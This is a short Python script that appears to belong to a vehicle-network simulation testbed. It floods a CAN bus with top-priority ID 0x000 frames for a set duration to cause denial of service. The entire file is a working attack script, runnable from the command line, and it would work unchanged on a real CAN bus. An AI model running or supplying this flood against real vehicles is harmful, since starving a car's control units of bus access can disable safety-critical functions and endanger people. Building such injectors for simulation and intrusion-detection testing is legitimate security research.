import time
import can
import os
import sys

sys.path.append(os.path.join(os.path.dirname(__file__), "..", "vehicle-sim"))
from can_bus_utils import get_can_bus

def run_dos_attack(duration=5, delay=0.001):
    """Floods the CAN bus with high priority ID 0x000 frames to cause Denial of Service."""
    bus = get_can_bus()
    print(f"[Attack Injector] Launching DoS Attack (duration={duration}s, delay={delay}s)...")
    start_t = time.time()
    count = 0
    payload = bytes([0xFF] * 8)
    
    while time.time() - start_t < duration:
        msg = can.Message(arbitration_id=0x000, data=payload, is_extended_id=False)
        try:
            bus.send(msg)
            count += 1
        except Exception as e:
            print(f"[Attack Injector Error] DoS send failure: {e}")
        time.sleep(delay)
        
    print(f"[Attack Injector] DoS Attack completed. Sent {count} high-priority frames.")
    return count

if __name__ == "__main__":
    dur = float(sys.argv[1]) if len(sys.argv) > 1 else 5.0
    run_dos_attack(duration=dur)
